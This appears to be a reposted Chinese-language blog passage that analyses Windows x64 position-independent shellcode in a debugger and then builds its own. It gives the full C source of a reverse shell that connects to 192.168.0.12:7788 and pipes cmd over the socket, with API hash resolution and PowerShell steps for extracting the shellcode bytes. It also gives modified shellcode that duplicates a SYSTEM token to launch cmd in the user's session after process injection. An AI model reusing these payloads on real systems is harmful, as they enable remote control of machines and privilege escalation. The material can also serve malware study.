//到这步之前就是查看导出库镜像的pe结构,通过偏移量和hash值进行比较
0:000> dc  poi(@rdx+20h)+3ch
00000001`3f19003c  000000f8 0eba1f0e cd09b400 4c01b821  ............!..L
00000001`3f19004c  685421cd 70207369 72676f72 63206d61  .!This program c
00000001`3f19005c  6f6e6e61 65622074 6e757220 206e6920  annot be run in 
00000001`3f19006c  20534f44 65646f6d 0a0d0d2e 00000024  DOS mode....$...
00000001`3f19007c  00000000 f903a08d aa6dc1c9 aa6dc1c9  ..........m...m.
00000001`3f19008c  aa6dc1c9 aaa63e14 aa6dc1ca aa6cc1c9  ..m..>....m...l.
00000001`3f19009c  aa6dc191 aa8c908f aa6dc1f1 aa8d908f  ..m.......m.....
00000001`3f1900ac  aa6dc1bf aab2908f aa6dc1c3 aa8c5f7c  ..m.......m.|_..
TcpKali!shellcode+0x53:
00000001`3f21e053 4885c0          test    rax,rax
0:000> p
TcpKali!shellcode+0x56:
00000001`3f21e056 7467            je      TcpKali!shellcode+0xbf (00000001`3f21e0bf) [br=1]
//接下来这一步下断点,说明找到了正确的导出库
0:000> bp 00000001`3f21e058
0:000> g
Breakpoint 1 hit
TcpKali!shellcode+0x58:
00000001`3f21e058 4801d0          add     rax,rdx
0:000> r
rax=0000000000101200 rbx=0000000000000000 rcx=0000000000000000
rdx=00000000771f0000 rsi=00000000773003c4 rdi=00000000002bfa20
rip=000000013f21e058 rsp=00000000002bf7d0 rbp=000000013f21e00a
 r8=00000000002bf938  r9=000000003e9a174f r10=000000000726774c
r11=0000000000000202 r12=00000000002bf810 r13=00000000002bf818
r14=00000000002bf9b8 r15=0000000000000000
iopl=0         nv up ei pl nz na po nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
//在这一步比较r9和r10=000000000726774c就是下面代码传递的第一个hash值,如果不相同继续递减rcx遍历导出函数库
0:000> r
rax=0000000000000000 rbx=0000000000000000 rcx=00000000000007bf
rdx=00000000771f0000 rsi=000000007730039b rdi=00000000002bfa20
rip=000000013f21e089 rsp=00000000002bf7c8 rbp=000000013f21e00a
 r8=00000000772f314c  r9=0000000095052c6a r10=000000000726774c
r11=0000000000000202 r12=00000000002bf810 r13=00000000002bf818
r14=00000000002bf9b8 r15=0000000000000000
iopl=0         nv up ei pl nz ac po nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000216
TcpKali!shellcode+0x89:
00000001`3f21e089 4539d1          cmp     r9d,r10d
//如果比较成功到这一步这个pop的rax就是最后push的那个rax
0:000> g
Breakpoint 3 hit
TcpKali!shellcode+0x8e:
00000001`3f21e08e 58              pop     rax
//这个rax经过计算后来到这一步
0:000> p
TcpKali!shellcode+0xa9:
00000001`3f21e0a9 4158            pop     r8
//可以看出rax就是要找的函数:=>kernel32!LoadLibraryA
0:000> uf @rax
kernel32!LoadLibraryA:
00000000`770e6510 48895c2410      mov     qword ptr [rsp+10h],rbx
00000000`770e6515 57              push    rdi
00000000`770e6516 4883ec20        sub     rsp,20h
00000000`770e651a 488bd9          mov     rbx,rcx
00000000`770e651d 4885c9          test    rcx,rcx
00000000`770e6520 7415            je      kernel32!LoadLibraryA+0x27 (00000000`770e6537)
//之后就是平衡堆栈r8和r9还原,jmp到找到那个导出库函数,由于之前用的是call所以call之后返回的地址仍然正确
0:000> p
TcpKali!shellcode+0xbc:
00000001`3f21e0bc ffe0            jmp     rax {kernel32!LoadLibraryA (00000000`770e6510)}
//接下来就是拼接参数调用库函数在jmp rax下断点得到的结果
0:000> g
ModLoad: 000007fe`fefb0000 000007fe`feffd000   C:\Windows\system32\ws2_32.DLL
ModLoad: 000007fe`fef10000 000007fe`fefaf000   C:\Windows\system32\msvcrt.dll
ModLoad: 000007fe`fdc20000 000007fe`fdd4d000   C:\Windows\system32\RPCRT4.dll
ModLoad: 000007fe`ff360000 000007fe`ff368000   C:\Windows\system32\NSI.dll
Breakpoint 3 hit
TcpKali!shellcode+0x8e:
00000001`3f21e08e 58              pop     rax
0:000> p
TcpKali!shellcode+0x8f:
00000001`3f21e08f 448b4024        mov     r8d,dword ptr [rax+24h] ds:000007fe`fefe16fc=000321a8
0:000> g
Breakpoint 4 hit
TcpKali!shellcode+0xbc:
00000001`3f21e0bc ffe0            jmp     rax {ws2_32!WSAStartup (000007fe`fefb4980)}
0:000> g
Breakpoint 4 hit
TcpKali!shellcode+0xbc:
00000001`3f21e0bc ffe0            jmp     rax {ws2_32!WSASocketA (000007fe`fefb2010)}
0:000> g
ModLoad: 000007fe`fc820000 000007fe`fc875000   C:\Windows\system32\mswsock.dll
ModLoad: 00000000`76fd0000 00000000`770ca000   C:\Windows\system32\user32.dll
ModLoad: 000007fe`ff040000 000007fe`ff0a7000   C:\Windows\system32\GDI32.dll
ModLoad: 000007fe`fee80000 000007fe`fee8e000   C:\Windows\system32\LPK.dll
ModLoad: 000007fe`fdd50000 000007fe`fde1a000   C:\Windows\system32\USP10.dll
ModLoad: 000007fe`ff0b0000 000007fe`ff0de000   C:\Windows\system32\IMM32.DLL
ModLoad: 000007fe`fd370000 000007fe`fd479000   C:\Windows\system32\MSCTF.dll
ModLoad: 000007fe`fba50000 000007fe`fba57000   C:\Windows\System32\wshtcpip.dll
Breakpoint 4 hit
TcpKali!shellcode+0xbc:
00000001`3f21e0bc ffe0            jmp     rax {ws2_32!connect (000007fe`fefb45c0)}
0:000> g
Breakpoint 4 hit
TcpKali!shellcode+0xbc:
00000001`3f21e0bc ffe0            jmp     rax {kernel32!CreateProcessA (00000000`7716afc0)}
0:000> g
ModLoad: 000007fe`fcdb0000 000007fe`fce07000   C:\Windows\system32\apphelp.dll
Breakpoint 4 hit
TcpKali!shellcode+0xbc:
00000001`3f21e0bc ffe0            jmp     rax {kernel32!WaitForSingleObject (00000000`770f14d0)}
0:000> g
//调用操作流程
1.查找到kernel32.dll库中的LoadLibraryA函数。
2.调用LoadLibraryA(“ws2_32”)导入套接字库。
3.遍历所有库找到ws2_32中的WsAStringToAddressA后通过偏移地址转化为WSAstartup并调用。
4.继续遍历找到ws2_32中的WSASocketA后通过偏移地址转化为WSAsocketA并调用。
5.继续遍历找到ws2_32中的connect后通过偏移地址转化为connect并调用。
6.查找到kernel32.dll库中的CreateProcessA函数并调用创建进程执行msf远程调用命令。
7.查找到kernel32.dll库中的WaitForSingleObject直到进程退出。
8.shellcode结束任务。
````
此版本shellcode对于c代码
```
VOID ExecutePayload( VOID )
{
	FuncLoadLibraryA MyLoadLibraryA;
	FuncWsaStartup MyWSAStartup;
	FuncWsaSocketA MyWSASocketA;
	FuncConnect MyConnect;	
	FuncCreateProcess MyCreateProcessA;
	FuncWaitForSingleObject MyWaitForSingleObject;
	WSADATA WSAData;
	SOCKET s;	
	struct sockaddr_in service;
	STARTUPINFO StartupInfo;
	PROCESS_INFORMATION ProcessInformation;
	// Strings must be treated as a char array in order to prevent them from being stored in
	// an .rdata section. In order to maintain position independence, all data must be stored
	// in the same section. Thanks to Nick Harbour for coming up with this technique:
	// http://nickharbour.wordpress.com/2010/07/01/writing-shellcode-with-a-c-compiler/
	char cmdline[] = { 'c', 'm', 'd', 0 };
	char module[] = { 'w', 's', '2', '_', '3', '2', '.', 'd', 'l', 'l', 0 };

	// Initialize structures. SecureZeroMemory is forced inline and doesn't call an external module
	SecureZeroMemory(&StartupInfo, sizeof(StartupInfo));
	SecureZeroMemory(&ProcessInformation, sizeof(ProcessInformation));

	#pragma warning( push )
	#pragma warning( disable : 4055 ) // Ignore cast warnings
	// Should I be validating that these return a valid address? Yes... Meh.
	MyLoadLibraryA = (FuncLoadLibraryA) GetProcAddressWithHash( 0x0726774C );

	// You must call LoadLibrary on the winsock module before attempting to resolve its exports.
	MyLoadLibraryA((LPTSTR) module);

	MyWSAStartup =			(FuncWsaStartup) GetProcAddressWithHash( 0x006B8029 );
	MyWSASocketA =			(FuncWsaSocketA) GetProcAddressWithHash( 0xE0DF0FEA );
	MyConnect =             (FuncConnect)GetProcAddressWithHash(0x6174A599);	
	MyCreateProcessA =		(FuncCreateProcess) GetProcAddressWithHash( 0x863FCC79 );
	MyWaitForSingleObject =	(FuncWaitForSingleObject) GetProcAddressWithHash( 0x601D8708 );
	#pragma warning( pop )

	MyWSAStartup( MAKEWORD( 2, 2 ), &WSAData );
	s = MyWSASocketA( AF_INET, SOCK_STREAM, 0, NULL, 0, 0 );

	service.sin_family = AF_INET;
	service.sin_addr.s_addr = SINADDR(192, 168, 0, 12); // Bind to 192.168.0.12
	service.sin_port = HTONS(BIND_PORT); //port 7788

	
	MyConnect(s, (SOCKADDR *)&service, sizeof(service));
	StartupInfo.hStdError = (HANDLE)s;
	StartupInfo.hStdOutput = (HANDLE)s;
	StartupInfo.hStdInput = (HANDLE)s;
	StartupInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	StartupInfo.cb = 68;

	
	MyCreateProcessA( 0, (LPTSTR) cmdline, 0, 0, TRUE, 0, 0, 0, &StartupInfo, &ProcessInformation );
	MyWaitForSingleObject( ProcessInformation.hProcess, INFINITE );
}
```
## DIY我的shellcode工程
### shellcode提取方法
如果要获取指定函数的hash值可以通过如下方法,,效果如图
```
1. 运行Powershell ISE
2. E:\git\ComZeroDay\PIC_Bindshell-master\PIC_Bindshell\Get-FunctionHash.ps1 
3. Get-FunctionHash kernel32.dll LoadLibraryA 
```
![ps](https://ftp.bmp.ovh/imgs/2020/03/acef8856348d0143.png)

对于提取shellcode的hex数据可以使用如下方法手动生成,也可以使用,shellcode工程自带生成时提取shellcode的hex,目录.bin文件
```
C:\Windows\system32>powershell "E:\git\ComZeroDay\PIC_Bindshell-master\PIC_Bindshell\Out-Shellcode.ps1"
位于命令管道位置 1 的 cmdlet Out-Shellcode.ps1
请为以下参数提供值:
InputExe: E:\git\ComZeroDay\PIC_Bindshell-master\x64\Release\PIC_Bindshell.exe
ProjectDir: E:\git\ComZeroDay\PIC_Bindshell-master\PIC_Bindshell
InputMapFile: E:\git\ComZeroDay\PIC_Bindshell-master\x64\Release\PIC_Bindshell.map
OutputFile: E:\git\ComZeroDay\PIC_Bindshell-master\x64\Release\PIC_Bindshell.bin
Shellcode length: 0x0296
```
### shellcode创建进程DIY
笔者设计了一种注入进程后启动新cmd在当前用户会话中的另一种shelcode实现,举个例子比如当前用户是管理员想注入system进程之后运行指定程序,由于图形界 session隔离的关系,system运行在0 session,而一般管理员运行在1 session,可以通过query user命令查看
```
PS C:\Windows\system32> query user
 用户名                会话名             ID  状态    空闲时间   登录时间
>cbwang505             console             1  运行中      无     2020/3/30 9:37
```
c代码实现,可以用来提取shellcode,这是笔者修改后的用于注入进程创建cmd的代码
```
// Write the logic for the primary payload here

// Normally, I would call this 'main' but if you call a function 'main', link.exe 
requires that you link against the CRT

// Rather, I will pass a linker option of "/ENTRY:ExecutePayload" in order to get 
around this issue.

VOID ExecutePayload( VOID )

{

       FuncLoadLibraryA MyLoadLibraryA;



       FuncCreateProcessAsUserA MyCreateProcessAsUserA;

       //FuncWaitForSingleObject MyWaitForSingleObject;

       

       FuncOpenProcessToken MyOpenProcessToken;

       FuncDuplicateTokenEx MyDuplicateTokenEx;

       FuncSetTokenInformation MySetTokenInformation;

       FuncGetCurrentProcess MyGetCurrentProcess;

       HANDLE token=NULL;

       HANDLE new_token = NULL;

       DWORD session_id = 1;

       STARTUPINFO StartupInfo;

       PROCESS_INFORMATION ProcessInformation;

       // Strings must be treated as a char array in order to prevent them from 
being stored in

       // an .rdata section. In order to maintain position independence, all data 
must be stored

       // in the same section. Thanks to Nick Harbour for coming up with this 
technique:

       // 
http://nickharbour.wordpress.com/2010/07/01/writing-shellcode-with-a-c-compiler/

       //char cmdline[] = { 'c','a','l','c','.','e','x','e',0 };

       char cmdline[] = { 'c', 'm', 'd', '.', 'e', 'x', 'e', 0 };

       char module[] = {'A','d','v','a','p','i','3','2','.','d','l','l',0};



       // Initialize structures. SecureZeroMemory is forced inline and doesn't 
call an external module

       SecureZeroMemory(&StartupInfo, sizeof(StartupInfo));

       SecureZeroMemory(&ProcessInformation, sizeof(ProcessInformation));



       #pragma warning( push )

       #pragma warning( disable : 4055 ) // Ignore cast warnings

       // Should I be validating that these return a valid address? Yes... Meh.

       MyLoadLibraryA = (FuncLoadLibraryA) GetProcAddressWithHash( 0x0726774C );

       MyGetCurrentProcess = 
(FuncGetCurrentProcess)GetProcAddressWithHash(0x51E2F352);

       // You must call LoadLibrary on the winsock module before attempting to 
resolve its exports.

       MyLoadLibraryA((LPTSTR) module);

       MyOpenProcessToken = 
(FuncOpenProcessToken)GetProcAddressWithHash(0x1B0BC626);

       MyDuplicateTokenEx = 
(FuncDuplicateTokenEx)GetProcAddressWithHash(0xC022CFDE);

       MySetTokenInformation = 
(FuncSetTokenInformation)GetProcAddressWithHash(0x5567F40C);

       MyCreateProcessAsUserA = 
(FuncCreateProcessAsUserA)GetProcAddressWithHash(0x06EC181F);

       //MyWaitForSingleObject = 
(FuncWaitForSingleObject)GetProcAddressWithHash(0x601D8708);

       #pragma warning( pop )     

       

       new_token=MyGetCurrentProcess();  

       MyOpenProcessToken(new_token, TOKEN_ALL_ACCESS, &token);      

       new_token = 0;

       MyDuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL, SecurityAnonymous, 
TokenPrimary, &new_token);

       MySetTokenInformation(new_token, TokenSessionId, &session_id, 
sizeof(session_id)); 

       StartupInfo.cb = sizeof(StartupInfo);           

       if (MyCreateProcessAsUserA(new_token, NULL, cmdline,

              NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &StartupInfo, 
&ProcessInformation))

       {

              //MyWaitForSingleObject(ProcessInformation.hProcess, INFINITE);

       }
```
### 我的注入进程shellcode运行效果
这个shellcode可以用来注入任意线程,有SeDebugPrivilege特权用户可以注入任意进程(内核保护的除外),非管理员或无此特权用户只能注入与当前用户相同权限进程,参数为进程id,效果如图:
![inject](https://ftp.bmp.ovh/imgs/2020/03/bf1386d62037070c.png)
## 相关项目

[原shellcode生成器git地址](
https://github.com/mattifestation/PIC_Bindshell/blob/master/PIC_Bindshell/BindShell.c "shellcode")
[我的git工程](http://u.720life.cn/g/2e71d0f0a5c601172267ba20d3a43c6e5ba287fbe87946b15c4e1b5f9978e1e37a9a6ff1dd160862bab4d0854be06128)

## 参与贡献

作者来自ZheJiang Guoli Security Technology,邮箱cbwang505@hotmail.com



 # 良心友情链接

[腾讯QQ群快速检索](http://u.720life.cn/s/8cf73f7c)

[软件免费开发论坛](http://u.720life.cn/s/bbb01dc0)

# 版权声明 

本文由良心工作室整理 欢迎加入[官方交流Q群](https://u.720life.cn/s/f2316816)谈合作

[本文转自如下链接](http://u.720life.cn/g/2e71d0f0a5c601172267ba20d3a43c6e5ba287fbe87946b15c4e1b5f9978e1e37a9a6ff1dd160862bab4d0854be06128ddf16352a683480d5c31a40af4abd813bb4bca3cd650286194793ce8a47ee1f8)